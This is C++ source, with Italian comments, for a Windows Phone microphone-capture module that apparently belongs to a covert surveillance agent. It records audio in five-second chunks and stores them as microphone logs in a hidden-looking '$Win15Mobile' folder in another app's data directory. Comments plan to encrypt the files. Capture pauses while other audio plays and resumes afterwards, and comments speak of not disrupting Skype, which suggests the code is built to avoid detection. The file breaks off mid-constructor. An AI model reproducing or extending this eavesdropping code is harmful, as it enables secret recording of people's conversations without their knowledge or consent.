#include "NativeAudioInterface.h"
#include "FunctionFunc.h"
#include "Log.h"
#include "Microphone.h"
#include "Audioclient.h"
#include "phoneaudioclient.h"

#pragma comment(lib, "Phoneaudioses.lib")


using namespace Microsoft::WRL;
using namespace Windows::Foundation;
using namespace Windows::Foundation::Collections;
using namespace Windows::Phone::Media::Capture;
using namespace Windows::Storage;
using namespace Concurrency;
using namespace Platform;

//messo qua per poter forzare lo stop da dentro OnSampleAvailable
Windows::Phone::Media::Capture::AudioVideoCaptureDevice ^pAudioVideoCaptureDevice;

HANDLE GlobalEventHandle=NULL;



#include <time.h>


#define DTTMFMT "%Y-%m-%d %H:%M:%S "
#define DTTMSZ 21

//#define DTTMFMTAUD "%Y%m%d%H%M%Sxxxxxx"
#define DTTMFMTAUD "%Y%m%d%H%M%S"
#define DTTMSZAUD 16


static int COSTRUITO=0;

static char *getDtTmAUD (char *buff) {
    time_t t = time (0);
    strftime(buff, DTTMSZAUD, DTTMFMTAUD, localtime (&t));
    return buff;
}

static char *getDtTm (char *buff) {
    time_t t = time (0);
    strftime(buff, DTTMSZ, DTTMFMT, localtime (&t));
    return buff;
}

#include <windows.h>
#include <iostream>
#include <fstream>

using namespace std;
using namespace NativeAudioInterface::Native;
//static int fAudio=FALSE;

MicAdditionalData mad2;



// Called each time a captured frame is available	
void CameraCaptureSampleSink::OnSampleAvailable(
	ULONGLONG hnsPresentationTime,
	ULONGLONG hnsSampleDuration,
	DWORD cbSample,
	BYTE* pSample)
{



	static char nomeFileBase[DTTMSZAUD];

	// creo file da 5sec 

	//1MB di buffer
	static BYTE bufferTmp[1024*512];
#ifdef _DEBUG
	//la grandezza del file comprende il timestamp + il trefisso audio piu 999999 campioni
	char nomeFile[sizeof("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\audio")+DTTMSZAUD+1+6];
#endif
	
	Log log;

	// hnsPresentationTime aumenta partendo da 0 allo start, 1 sec=10000000
	 // Header= 35, 33, 65, 77, 82, 10
	 // Header= 23  21  41  4D  52  0A

	//per evitare gli ultimi campionamenti spuri evito di eseguire ulteriore codice 
	//if (NativeAudioInterface::Native::NativeCapture::fAudioCaptureForceStop==TRUE) return;
	if (NativeCapture::fAudioCaptureForceStop==TRUE) return;

	if(NativeCapture::pos==0&&NativeCapture::nCamp==1)
	{
		BYTE HEADER[]={35, 33, 65, 77, 82, 10};
		
		memcpy(bufferTmp,HEADER,sizeof(HEADER));
		NativeCapture::pos=sizeof(HEADER);

		//creo il nome del file come data file (poi vedro' come criptarli)
		char buff[DTTMSZAUD];
   		getDtTmAUD(buff);
		strcpy(nomeFileBase,buff);

		//
#ifdef _DEBUG
		WCHAR msg[128];
		swprintf_s(msg, L"\n1Header) Pos=%i nCamp=%i: \n",NativeCapture::pos,NativeCapture::nCamp);OutputDebugString(msg);
#endif

		
		unsigned __int64 temp_time = GetTime();
	
		ZeroMemory(&mad2, sizeof(mad2));
		mad2.uVersion = MIC_LOG_VERSION;
		mad2.uSampleRate = MIC_SAMPLE_RATE | LOG_AUDIO_CODEC_AMR;
		mad2.fId.dwHighDateTime = (DWORD)((temp_time & 0xffffffff00000000) >> 32);
		mad2.fId.dwLowDateTime  = (DWORD)(temp_time & 0x00000000ffffffff);

	}
	//else 
	//	pos=0;

	
	memcpy(bufferTmp+NativeCapture::pos,pSample,cbSample);
	NativeCapture::pos=NativeCapture::pos+cbSample;

	//catturo blocchi di 5 sec 
	/*
	if((hnsPresentationTime>(ULONGLONG)5*10000000) && (NativeAudioInterface::Native::NativeCapture::fAudioCapture==TRUE))
	{
		NativeAudioInterface::Native::NativeCapture::fAudioCapture=FALSE;
			
		fstream filestr;
		sprintf(nomeFile,"audio%s_%i.amr",nomeFileBase,nCamp);
		filestr.open(nomeFile, fstream::out|fstream::binary|fstream::app);
		filestr.seekg (0, ios::beg);
		filestr.write ((const char*)bufferTmp, pos);
		filestr.close();
		OutputDebugStringA(nomeFile);
		//pos=0;
		nCamp++;
	}
	*/
	DWORD b=false;
	_Media_Queue_GameHasControl(&b);
	if(NativeCapture::fAudioCapture==FALSE || b==0)
	{
#ifdef _DEBUG
		WCHAR msg[128];
		swprintf_s(msg, L"\n3exit) Pos=%i nCamp=%i: \n",NativeCapture::pos,NativeCapture::nCamp);OutputDebugString(msg);


		//dovrei entrare qua dentro solo quando stoppo il processo per cui mi trovo un trunk non completo
		fstream filestr;
		sprintf(nomeFile,"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\audio%s_%.4i.amr",nomeFileBase,NativeCapture::nCamp);
		filestr.open(nomeFile, fstream::out|fstream::binary|fstream::app);
		filestr.seekg (0, ios::beg);
		filestr.write ((const char*)bufferTmp, NativeCapture::pos);
		filestr.close();
#endif
		if (log.CreateLog(LOGTYPE_MIC, (BYTE *)&mad2, sizeof(mad2), FLASH) == FALSE) 
			{
				return;
			}

			log.WriteLog( (BYTE*)bufferTmp, NativeCapture::pos );

		log.CloseLog();
#ifdef _DEBUG
		OutputDebugStringA(nomeFile);OutputDebugStringA("\n");
#endif
		NativeCapture::fAudioCaptureForceStop=TRUE;
		NativeCapture::pos=0;
		NativeCapture::nCamp=1;
		if(b==0) 
		{
			////_ZMediaQueue_DisconnectFromService(); //tolto perche' mi crea un eccezione a liverllo di kernel; controllare se si autodisalloca o se crea problemi
			NativeCapture::fAudioCapture=FALSE;
			
			Log logInfo;
			logInfo.WriteLogInfo(L"Suspending microphone while audio is playing in background");

			NativeCapture::fStartPlay=FALSE;
			/////  TOGLIENDOLO FUNZIONA
			try
			{
				pAudioVideoCaptureDevice->StopRecordingAsync();
			}
			catch (Platform::Exception^ e) 
			{
				Log logInfo;
				//in realta' se arrivo qua è perche' c'e' un crash nel modulo per ora lo lascio cosi' per fare il debug
				logInfo.WriteLogInfo(L"Microphone is in use. [id4]");
			}

			//aggiunto prima del rilascio per riavviare la cattura se si risolve l'occupazione delle risorsa audio
			
			//controllo ogni 10 sec che sia finito il playng dell'audio in bk	
			while(_WaitForSingleObject(GlobalEventHandle, 10000))
			{
				_Media_Queue_GameHasControl(&b);
				if(b==1)
				{
					//OutputDebugString(L"Nessun play attivo");	
					NativeCapture::fStartPlay=TRUE;
					try
					{
						pAudioVideoCaptureDevice->StartRecordingToSinkAsync();
						// PER RELEASE Controllare se non devo inizializzare anche pos ncamp ecc..
						NativeCapture::fAudioCapture=TRUE;
						NativeCapture::fAudioCaptureForceStop=FALSE;
						Log logInfo;
						logInfo.WriteLogInfo(L"Resume microphone");
						/////_ZMediaQueue_DisconnectFromService();
					}
					catch (Platform::Exception^ e) 
					{
#ifdef _DEBUG
						OutputDebugString(L"<<<eccezione capture Mic6 gestita>>>\n");
						///OutputDebugString(*((wchar_t**)(*((int*)(((Platform::Exception^)((Platform::COMException^)(e)))) - 1)) + 1));
#endif

						Log logInfo;
						//in realta' se arrivo qua è perche' c'e' un crash nel modulo per ora lo lascio cosi' per fare il debug
						logInfo.WriteLogInfo(L"Microphone is in use. [id6]");
						///logInfo.WriteLogInfo(*((wchar_t**)(*((int*)(((Platform::Exception^)((Platform::COMException^)(e)))) - 1)) + 1));

					}
//					return;					
					break;
				}
			}


		}
	}
	else if( (ULONGLONG)(hnsPresentationTime/10000000)>(ULONGLONG)(5*NativeCapture::nCamp))
		{
			//NativeAudioInterface::Native::NativeCapture::fAudioCapture=FALSE;
			
#ifdef _DEBUG
			WCHAR msg[128];
			swprintf_s(msg, L"\n2camp) Pos=%i nCamp=%i hnsPresentationTime=%x hnsPresentationTime/10000000=%x\n",NativeCapture::pos,NativeCapture::nCamp,(ULONGLONG)hnsPresentationTime,(ULONGLONG)(hnsPresentationTime/10000000));OutputDebugString(msg);



			fstream filestr;
			sprintf(nomeFile,"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\audio%s_%.4i.amr",nomeFileBase,NativeCapture::nCamp);
			filestr.open(nomeFile, fstream::out|fstream::binary|fstream::app);
			filestr.seekg (0, ios::beg);
			filestr.write ((const char*)bufferTmp, NativeCapture::pos);
			filestr.close();
#endif
			if (log.CreateLog(LOGTYPE_MIC, (BYTE *)&mad2, sizeof(mad2), FLASH) == FALSE) 
			{
				return;
			}

			log.WriteLog( (BYTE*)bufferTmp, NativeCapture::pos );
#ifdef _DEBUG
			OutputDebugStringA(nomeFile);OutputDebugStringA("\n");
#endif
			NativeCapture::pos=0;
			NativeCapture::nCamp++;
		}
	

}

void NativeCapture::StopCapture()
{
	
	fAudioCapture=FALSE;	
/***
	Windows::Foundation::TimeSpan span;
	span.Duration = 10000000L;   // convert 1 sec to 100ns ticks
	 
	Windows::Phone::Devices::Notification::VibrationDevice^ vibr = Windows::Phone::Devices::Notification::VibrationDevice::GetDefault();
	vibr->Vibrate(span);
***/
	////_ZMediaQueue_DisconnectFromService(); //tolto perche' mi crea un eccezione a liverllo di kernel; controllare se si autodisalloca o se crea problemi
	
	
	//se è gia' false significa l'ho stoppato precedentemente 
   	if(fStartPlay==TRUE) 
	{
		fStartPlay=FALSE;
					/////  TOGLIENDOLO FUNZIONA
			try
			{
				pAudioVideoCaptureDevice->StopRecordingAsync();
			}
			catch (Platform::Exception^ e) 
			{
				Log logInfo;
				//in realta' se arrivo qua è perche' c'e' un crash nel modulo per ora lo lascio cosi' per fare il debug
				logInfo.WriteLogInfo(L"Microphone is in use. [id5]");
			}
		

	}
	
 



	//pAudioVideoCaptureDevice=nullptr;

}

#include <thread>
#include <chrono>


class MyAudioSink
{
private:
        int counter;
		fstream filestr;
public:
        MyAudioSink()
        {
                counter = 0;
				//sprintf(nomeFile,"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\audio%s_%.4i.amr",nomeFileBase,NativeCapture::nCamp);
				filestr.open("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\audio.wav", fstream::out|fstream::binary|fstream::app);
				filestr.seekg (0, ios::beg);
				
        }

        HRESULT SetFormat(WAVEFORMATEX *pwfx)
        {
                return 0;
        }

        HRESULT CopyData(BYTE *pData, UINT32 numFramesAvailable, BOOL *bDone)
        {
                printf("%i\n", numFramesAvailable);
                counter++;
                if (counter > 2000) {
						filestr.close();
                        return -1;
                }
                else
                {
						filestr.write ((const char*)pData, numFramesAvailable);
                        return 0;
                }
        }
};

//-----------------------------------------------------------
// Record an audio stream from the default audio capture
// device. The RecordAudioStream function allocates a shared
// buffer big enough to hold one second of PCM audio data.
// The function uses this buffer to stream data from the
// capture device. The main loop runs every 1/2 second.
//-----------------------------------------------------------

// REFERENCE_TIME time units per second and per millisecond
#define REFTIMES_PER_SEC  10000000
#define REFTIMES_PER_MILLISEC  10000

#define EXIT_ON_ERROR(hres)  \
              if (FAILED(hres)) { goto Exit; }
#define SAFE_RELEASE(punk)  \
              if ((punk) != NULL)  \
                { (punk)->Release(); (punk) = NULL; }

const IID IID_IAudioClient = __uuidof(IAudioClient);
const IID IID_IAudioCaptureClient = __uuidof(IAudioCaptureClient);


/* FUNZIONA PER EGISTRARE MA QUANDO SI DISIDRATA L'app va in silent
HRESULT RecordAudioStream(MyAudioSink *pMySink)
{
    HRESULT hr;
    REFERENCE_TIME hnsRequestedDuration = REFTIMES_PER_SEC;
    REFERENCE_TIME hnsActualDuration;
    UINT32 bufferFrameCount;
    UINT32 numFramesAvailable;
    
	//IMMDeviceEnumerator *pEnumerator = NULL;
    //IMMDevice *pDevice = NULL;

    IAudioClient *pAudioClient = NULL;
    IAudioCaptureClient *pCaptureClient = NULL;
    WAVEFORMATEX *pwfx = NULL;
    UINT32 packetLength = 0;
    BOOL bDone = FALSE;
    BYTE *pData;
    DWORD flags;

	
	LPCWSTR pwstrDefaultCaptureDeviceId = GetDefaultAudioCaptureId(AudioDeviceRole::Communications);
	hr = ActivateAudioInterface(pwstrDefaultCaptureDeviceId, __uuidof(IAudioClient2), (void**)&pAudioClient);
	

    hr = pAudioClient->GetMixFormat(&pwfx);
    EXIT_ON_ERROR(hr)


 
     PWAVEFORMATEXTENSIBLE wave_format_extensible = reinterpret_cast<WAVEFORMATEXTENSIBLE*>(static_cast<WAVEFORMATEX*>(pwfx));


    hr = pAudioClient->Initialize(
                         AUDCLNT_SHAREMODE_SHARED,
                         0,
                         hnsRequestedDuration,
                         0,
                         pwfx,
                         NULL);
    EXIT_ON_ERROR(hr)

    // Get the size of the allocated buffer.
    hr = pAudioClient->GetBufferSize(&bufferFrameCount);
    EXIT_ON_ERROR(hr)

    hr = pAudioClient->GetService(
                         IID_IAudioCaptureClient,
                         (void**)&pCaptureClient);
    EXIT_ON_ERROR(hr)

    // Notify the audio sink which format to use.
    hr = pMySink->SetFormat(pwfx);
    EXIT_ON_ERROR(hr)

    // Calculate the actual duration of the allocated buffer.
    hnsActualDuration = (double)REFTIMES_PER_SEC *
                     bufferFrameCount / pwfx->nSamplesPerSec;

	
	OutputDebugString(L"START\n");
    hr = pAudioClient->Start();  // Start recording.
    EXIT_ON_ERROR(hr)

    // Each loop fills about half of the shared buffer.
    while (bDone == FALSE)
    {
        // Sleep for half the buffer duration.
        _Sleep(hnsActualDuration/REFTIMES_PER_MILLISEC/2);

        hr = pCaptureClient->GetNextPacketSize(&packetLength);
        EXIT_ON_ERROR(hr)

        while (packetLength != 0)
        {
            // Get the available data in the shared buffer.
            hr = pCaptureClient->GetBuffer(
                                   &pData,
                                   &numFramesAvailable,
                                   &flags, NULL, NULL);
            EXIT_ON_ERROR(hr)

            if (flags & AUDCLNT_BUFFERFLAGS_SILENT)
            {
                pData = NULL;  // Tell CopyData to write silence.
				OutputDebugString(L"silence\n");
            }
			else
			{
			DWORD dataSize = pwfx->nBlockAlign * numFramesAvailable;

			WCHAR msg[128];
			swprintf_s(msg, L"dataSize=%i: \n",dataSize);OutputDebugString(msg);

            // Copy the available capture data to the audio sink.
            hr = pMySink->CopyData(
                              pData, dataSize, &bDone);
            EXIT_ON_ERROR(hr)
			}
            hr = pCaptureClient->ReleaseBuffer(numFramesAvailable);
            EXIT_ON_ERROR(hr)

            hr = pCaptureClient->GetNextPacketSize(&packetLength);
            EXIT_ON_ERROR(hr)
        }
    }


	OutputDebugString(L"STOP\n");
    hr = pAudioClient->Stop();  // Stop recording.
    EXIT_ON_ERROR(hr)

Exit:
    CoTaskMemFree(pwfx);
//    SAFE_RELEASE(pEnumerator)
 //   SAFE_RELEASE(pDevice);
    SAFE_RELEASE(pAudioClient);
    SAFE_RELEASE(pCaptureClient);

    return hr;
}
*/

//#include <windows.h>
// 
//#include <synchapi.h>
//#include <audioclient.h>
//#include <phoneaudioclient.h>
 

HRESULT SetVolumeOnSession( UINT32 volume )
{
    if (volume > 100)
    {
        return E_INVALIDARG;
    }

    HRESULT hr = S_OK;
    ISimpleAudioVolume *SessionAudioVolume = nullptr;
    float ChannelVolume = 0.0;


	IAudioClient2* m_AudioClient=NULL;
	WAVEFORMATEX* m_waveFormatEx=NULL;
	int m_sourceFrameSizeInBytes;
    IAudioRenderClient* m_pRenderClient=NULL;

    LPCWSTR renderId = GetDefaultAudioRenderId(AudioDeviceRole::Default);
 
    if (NULL == renderId)
    {
        hr = E_FAIL;
    }
    else
    {
        hr = ActivateAudioInterface(renderId, __uuidof(IAudioClient2), (void**)&m_AudioClient);
    }


    hr = m_AudioClient->GetService( __uuidof(ISimpleAudioVolume), reinterpret_cast<void**>(&SessionAudioVolume) );
    if (FAILED( hr ))
    {
        goto exit;
    }

    ChannelVolume = volume / (float)100.0;

    // Set the session volume on the endpoint
    hr = SessionAudioVolume->SetMasterVolume( ChannelVolume, nullptr );

exit:
    SAFE_RELEASE( SessionAudioVolume );
    return hr;
}


HRESULT InitRender()
{
    HRESULT hr = E_FAIL;
	IAudioClient2* m_pDefaultRenderDevice=NULL;
	WAVEFORMATEX* m_waveFormatEx=NULL;
	int m_sourceFrameSizeInBytes;
    IAudioRenderClient* m_pRenderClient=NULL;

    ISimpleAudioVolume *SessionAudioVolume = nullptr;
    float ChannelVolume = 0.0;


    LPCWSTR renderId = GetDefaultAudioRenderId(AudioDeviceRole::Default);
 
    if (NULL == renderId)
    {
        hr = E_FAIL;
    }
    else
    {
        hr = ActivateAudioInterface(renderId, __uuidof(IAudioClient2), (void**)&m_pDefaultRenderDevice);
    }
 
    if (SUCCEEDED(hr))
    {
        hr = m_pDefaultRenderDevice->GetMixFormat(&m_waveFormatEx);
    }
 
    // Set the category through SetClientProperties
    AudioClientProperties properties = {};
    if (SUCCEEDED(hr))
    {
        properties.cbSize = sizeof AudioClientProperties;
        properties.eCategory = AudioCategory_Communications;
        hr = m_pDefaultRenderDevice->SetClientProperties(&properties);
    }
 
    if (SUCCEEDED(hr))
    {
		/***
        WAVEFORMATEX temp;
        MyFillPcmFormat(temp, 2, 44100, 16); // stereo, 44100 Hz, 16 bit
 
        *m_waveFormatEx = temp;
		***/
		
		//typedef struct tWAVEFORMATEX
		//{
		//	WORD    wFormatTag;        /* format type */
		//	WORD    nChannels;         /* number of channels (i.e. mono, stereo...) */
		//	DWORD   nSamplesPerSec;    /* sample rate */
		//	DWORD   nAvgBytesPerSec;   /* for buffer estimation */
		//	WORD    nBlockAlign;       /* block size of data */
		//	WORD    wBitsPerSample;    /* Number of bits per sample of mono data */
		//	WORD    cbSize;            /* The count in bytes of the size of
		//									extra information (after cbSize) */

		//} WAVEFORMATEX;
	/*
		m_waveFormatEx->nChannels=2;
		m_waveFormatEx->nSamplesPerSec=44100;
		m_waveFormatEx->wBitsPerSample=16;
		*/
        m_sourceFrameSizeInBytes = (m_waveFormatEx->wBitsPerSample / 8) * m_waveFormatEx->nChannels;
 
        hr = m_pDefaultRenderDevice->Initialize(AUDCLNT_SHAREMODE_SHARED, 0x88000000, 1000 * 10000, 0, m_waveFormatEx, NULL);
    }
 
    if (SUCCEEDED(hr))
    {
        hr = m_pDefaultRenderDevice->GetService(__uuidof(IAudioRenderClient), (void**)&m_pRenderClient);
    }


	    hr = m_pDefaultRenderDevice->GetService( __uuidof(ISimpleAudioVolume), reinterpret_cast<void**>(&SessionAudioVolume) );
    if (FAILED( hr ))
    {
       // goto exit;
    }

    ChannelVolume = 80 / (float)100.0;

    // Set the session volume on the endpoint
    hr = SessionAudioVolume->SetMasterVolume( ChannelVolume, nullptr );


 
    if (SUCCEEDED(hr))
    {
       /// hr = m_pDefaultRenderDevice->Start();
    }
 
    if (renderId)
    {
        CoTaskMemFree((LPVOID)renderId);
    }


	//---

	   hr = S_OK;
 
        if (m_pDefaultRenderDevice)
        {
           /// hr = m_pDefaultRenderDevice->Stop();
        }
 
        if (m_pRenderClient)
        {
            m_pRenderClient->Release();
            m_pRenderClient = NULL;
        }
 
        if (m_pDefaultRenderDevice)
        {
            m_pDefaultRenderDevice->Release();
            m_pDefaultRenderDevice = NULL;
        }
 
        if (m_waveFormatEx)
        {
            CoTaskMemFree((LPVOID)m_waveFormatEx);
            m_waveFormatEx = NULL;
        }

 
    return hr;
}

HRESULT InitAudioStream()
{
    HRESULT hr;
    REFERENCE_TIME hnsRequestedDuration = REFTIMES_PER_SEC;
    UINT32 bufferFrameCount;

    IAudioClient *pAudioClient = NULL;
	IAudioRenderClient* m_pRenderClient = NULL;
    WAVEFORMATEX *pwfx = NULL;
    UINT32 packetLength = 0;
    BOOL bDone = FALSE;


	
	LPCWSTR pwstrDefaultRenderDeviceId = GetDefaultAudioRenderId(AudioDeviceRole::Default);
	hr = ActivateAudioInterface(pwstrDefaultRenderDeviceId, __uuidof(IAudioClient), (void**)&pAudioClient);
	
    hr = pAudioClient->GetMixFormat(&pwfx);
    EXIT_ON_ERROR(hr)

  
    hr = pAudioClient->Initialize(
                         AUDCLNT_SHAREMODE_SHARED,
                         0x88000000,
						 //AUDCLNT_STREAMFLAGS_LOOPBACK,
                         hnsRequestedDuration,
                         0,
                         pwfx,
                         NULL);
    EXIT_ON_ERROR(hr)

    // Get the size of the allocated buffer.
    hr = pAudioClient->GetBufferSize(&bufferFrameCount);
    EXIT_ON_ERROR(hr)

	hr = pAudioClient->GetService(__uuidof(IAudioRenderClient), (void**)&m_pRenderClient);

    EXIT_ON_ERROR(hr)
   
	
	// l'ho tolto per il rilascio del core per vedere se era questo che influenzava il crash dell'app
	// pero' devo vedere se senza questo sotto si sente ancora il glich dallo speacher

	//OutputDebugString(L"START\n");
    hr = pAudioClient->Start();  // Start recording.
    EXIT_ON_ERROR(hr)

	_Sleep(1000);
	hr = pAudioClient->Stop();  // Stop recording.

Exit:
    SAFE_RELEASE(m_pRenderClient);
    SAFE_RELEASE(pAudioClient);   
	CoTaskMemFree(pwfx);
   

    return hr;
}


#pragma comment( lib, "xaudio2.lib")
#include <xaudio2.h>


void initXaudio2(void)
{
	  UINT32 flags = 0; 
    
	  interface IXAudio2* m_audioEngine=NULL; 
	  interface IXAudio2MasteringVoice*       m_masteringVoice=NULL; 

      XAudio2Create(&m_audioEngine, flags);
	  m_audioEngine->CreateMasteringVoice(&m_masteringVoice, XAUDIO2_DEFAULT_CHANNELS, 48000 );

	  //se setto come qua sotto gliccia di brutto
	  //XAudio2Create(&m_audioEngine, 0, XAUDIO2_DEFAULT_PROCESSOR);
	  //m_audioEngine->CreateMasteringVoice(&m_masteringVoice);

	  
	if (m_masteringVoice != nullptr) 
    { 
        m_masteringVoice->DestroyVoice(); 
        m_masteringVoice = nullptr; 
    } 

	if (m_audioEngine != nullptr) 
    { 
        m_audioEngine->Release(); 
        m_audioEngine = nullptr; 
    } 
}


int NativeCapture::StartCapture(HANDLE eventHandle)
{
	
	fAudioCapture=TRUE;	
	NativeCapture::fAudioCaptureForceStop=FALSE;
	//aggiunta per gestire dentro OnSampleAvailable il rilascio della risorsa audio
	GlobalEventHandle=eventHandle;

	/***
	Windows::Foundation::TimeSpan span;
	span.Duration = 30000000L;   // convert 1 sec to 100ns ticks
	 
	Windows::Phone::Devices::Notification::VibrationDevice^ vibr = Windows::Phone::Devices::Notification::VibrationDevice::GetDefault();
	vibr->Vibrate(span);
***/

	//mi sconnetto dal servizio che mi tira su la possibiblita' di controllare il playng in bg dell'audio
	//non posso ceccare se sono gia' precedentemente connesso
	
	//try
	//{
	//	_ZMediaQueue_DisconnectFromService();
	//}
	//catch (Platform::Exception^ e) 
	//{
	//	//controllare se qui non crea eccezione a livello kernel
	//	OutputDebugString(L"<<<eccezione _ZMediaQueue_DisconnectFromService gestita>>>\n");
	//}

	_ZMediaQueue_ConnectToService();

	DWORD b=false;
	_Media_Queue_GameHasControl(&b);
	if(b==1)
	{
		//OutputDebugString(L"Nessun play attivo");	
		fStartPlay=TRUE;

				
		/*
		Registra l'audio
		MyAudioSink pMyAudioSink;
		RecordAudioStream(&pMyAudioSink);
		*/
		
		try
		{
			//sembrerebbe che se inizializzo la periferica audio di render inizializza lo speacker e non si sente piu' il glic quando attivo il microfono
			
			// da rimettere tolto per verificare il rash del positio + mic
			
			// BYGIO INIZIARE DA QUI:: TOLTO perche' l'init incasina skype

			//InitRender();

			//SetVolumeOnSession( 100 );

			///InitAudioStream(); ///HO TESTATO CRASHA LO STESSO POSSO RTIMETTERLA

			#define SND_ASYNC    0x0001
			#define SND_FILENAME 0x00020000
		//	/*
		//	 SND_SYNC =           0x0000,  /* play synchronously (default) */
  //SND_ASYNC =          0x0001,  /* play asynchronously */
  //SND_NODEFAULT =      0x0002,  /* silence (!default) if sound not found */
  //SND_MEMORY =         0x0004,  /* pszSound points to a memory file */
  //SND_LOOP =           0x0008,  /* loop the sound until next sndPlaySound */
  //SND_NOSTOP =         0x0010,  /* don't stop any currently playing sound */
		//	*/
		
			// sembra che se playo un wav silenzioso non si sente piu' il glic peccato che skype poi non vuole sapere di funzionare 
			/*
			_PlaySoundW(NULL, 0, 0);
			//_PlaySoundW(TEXT("alarma.wav"), NULL, SND_FILENAME|0x0000);	
			_PlaySoundW(TEXT("silence.wav"), NULL, SND_FILENAME|0x0000);	
			_Sleep(1000);
			*/

			//DWORD RecordAudioStreamThreadId;
			//HANDLE  hRepeat = _CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RecordAudioStream, (void*)&pMyAudioSink, 0, &RecordAudioStreamThreadId);


			//idem se inizializzo xaudio skype poi non funziona
			//initXaudio2();
	
		
			/////  DA RIMETTERE 
			pAudioVideoCaptureDevice->StartRecordingToSinkAsync();
			/////_ZMediaQueue_DisconnectFromService();
		}
		catch (Platform::Exception^ e) 
		{
#ifdef _DEBUG
			OutputDebugString(L"<<<eccezione capture Mic2 gestita>>>\n");
			///OutputDebugString(*((wchar_t**)(*((int*)(((Platform::Exception^)((Platform::COMException^)(e)))) - 1)) + 1));
#endif

			Log logInfo;
			//in realta' se arrivo qua è perche' c'e' un crash nel modulo per ora lo lascio cosi' per fare il debug
			logInfo.WriteLogInfo(L"Microphone is in use. [id2]");
			///logInfo.WriteLogInfo(*((wchar_t**)(*((int*)(((Platform::Exception^)((Platform::COMException^)(e)))) - 1)) + 1));

		}
		return FALSE;
	}

	//OutputDebugString(L"Play attivo");
	Log logInfo;
	logInfo.WriteLogInfo(L"Can not activate microphone while background audio is playing, standing by");

	//controllo ogni 10 sec che sia finito il playng dell'audio in bk	
	while(fAudioCapture==TRUE && _WaitForSingleObject(eventHandle, 10000))
	{
		_Media_Queue_GameHasControl(&b);
		if(b==1)
		{
			//OutputDebugString(L"Nessun play attivo");	
			fStartPlay=TRUE;
			try
			{
				/////  DA RIMETTERE 
				pAudioVideoCaptureDevice->StartRecordingToSinkAsync();
				Log logInfo;
				logInfo.WriteLogInfo(L"Resume microphone");

				/////_ZMediaQueue_DisconnectFromService();
			}
			catch (Platform::Exception^ e) 
			{
#ifdef _DEBUG
				OutputDebugString(L"<<<eccezione capture Mic3 gestita>>>\n");
				///OutputDebugString(*((wchar_t**)(*((int*)(((Platform::Exception^)((Platform::COMException^)(e)))) - 1)) + 1));
#endif

				Log logInfo;
				//in realta' se arrivo qua è perche' c'e' un crash nel modulo per ora lo lascio cosi' per fare il debug
				logInfo.WriteLogInfo(L"Microphone is in use. [id3]");
				///logInfo.WriteLogInfo(*((wchar_t**)(*((int*)(((Platform::Exception^)((Platform::COMException^)(e)))) - 1)) + 1));

			}
			return TRUE;
		}
	}


return TRUE;

		
		/*****
		//acrocchio che mi permette di aspettare sino a 10 sec che sia completata 
		//l'operazioe di inizializzazione tramite IAsyncOperation (non riesco a trovare un metodo piu' pulito)
		for(int i=0;i<20;i++)
		{
			
			auto stato=openOperation->Status;
			//if (openOperation->Status!=Windows::Foundation::AsyncStatus::Started) 
			if (openOperation->Status==Windows::Foundation::AsyncStatus::Completed)
				{
					fAudioCaptureForceStop=FALSE;
					pAudioVideoCaptureDevice->StartRecordingToSinkAsync();
					break;
				}
			std::this_thread::sleep_for(std::chrono::milliseconds(500));
		}
		****/


}



NativeAudioInterface::Native::NativeCapture::NativeCapture()
{
	//initXaudio2();

	fStartPlay=FALSE;
	fAudioCapture=FALSE;
	/*****
	abilitando non rifaccio un nuovo new per ogni volta che devo attivare il microfono ma sfrutto quanto gia'  allocato in precedenza
	visto che dai test fatti in AudioOnly.sln diventa instabile
	if (COSTRUITO>0)
	{
		NativeCapture::pos=0;
		NativeCapture::nCamp=1;
		return;
	}
	else COSTRUITO++;
	*****/
/*****
	//IAsyncOperation<AudioVideoCaptureDevice^> ^openOperation = AudioVideoCaptureDevice::OpenForAudioOnlyAsync();
	openOperation = AudioVideoCaptureDevice::OpenForAudioOnlyAsync();

	openOperation->Completed = ref new AsyncOperationCompletedHandler<AudioVideoCaptureDevice^>(
		[this] (IAsyncOperation<AudioVideoCaptureDevice^> ^operation, Windows::Foundation::AsyncStatus status)
		{
			if (status == Windows::Foundation::AsyncStatus::Completed)
			{
				auto captureDevice = operation->GetResults();

				// Save the reference to the opened video capture device
				pAudioVideoCaptureDevice = captureDevice;


				// Retrieve the native ICameraCaptureDeviceNative interface from the managed video capture device
				ICameraCaptureDeviceNative *iCameraCaptureDeviceNative = NULL; 
				HRESULT hr = reinterpret_cast<IUnknown*>(pAudioVideoCaptureDevice)->QueryInterface(__uuidof(ICameraCaptureDeviceNative), (void**) &iCameraCaptureDeviceNative);

				// Save the pointer to the native interface
				pCameraCaptureDeviceNative = iCameraCaptureDeviceNative;
			
				// Retrieve IAudioVideoCaptureDeviceNative native interface from managed projection.
				IAudioVideoCaptureDeviceNative *iAudioVideoCaptureDeviceNative = NULL;
				hr = reinterpret_cast<IUnknown*>(pAudioVideoCaptureDevice)->QueryInterface(__uuidof(IAudioVideoCaptureDeviceNative), (void**) &iAudioVideoCaptureDeviceNative);

				// Save the pointer to the IAudioVideoCaptureDeviceNative native interface
				pAudioVideoCaptureDeviceNative = iAudioVideoCaptureDeviceNative;

				
				pAudioVideoCaptureDevice->AudioEncodingFormat = CameraCaptureAudioFormat::Amr;
				
				// Initialize and set the CameraCaptureSampleSink class as sink for captures samples
				MakeAndInitialize<CameraCaptureSampleSink>(&pCameraCaptureSampleSink);
				pAudioVideoCaptureDeviceNative->SetAudioSampleSink(pCameraCaptureSampleSink);

				//Start recording (only way to receive samples using the ICameraCaptureSampleSink interface
				//fAudio=TRUE;
				//pAudioVideoCaptureDevice->StartRecordingToSinkAsync();
				//////////fAudioCapture=TRUE;

				//TRUE => che ho finito l'inizializzazione
				//fAudioCapture=TRUE;
				
			}
		}
	);
	***/

	//converto da asincrono ad sincrono l'inizializzazione del mic

	concurrency::cancellation_token_source AudioTaskTokenSource;

	task<AudioVideoCaptureDevice^> AudioTask(AudioVideoCaptureDevice::OpenForAudioOnlyAsync(), AudioTaskTokenSource.get_token());


